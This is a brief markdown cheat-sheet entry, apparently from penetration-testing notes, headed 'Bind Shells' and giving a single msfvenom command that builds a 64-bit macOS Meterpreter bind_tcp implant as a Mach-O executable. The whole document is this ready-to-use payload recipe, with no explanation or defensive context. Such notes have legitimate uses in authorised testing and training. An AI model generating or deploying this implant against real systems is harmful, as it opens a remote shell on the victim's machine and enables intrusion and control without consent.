# Bind Shells

1. x86-64 (64-bit) Payloads

```
$ msfvenom -p osx/x64/meterpreter/bind_tcp lport=<PORT> -f macho -o implant-x64
```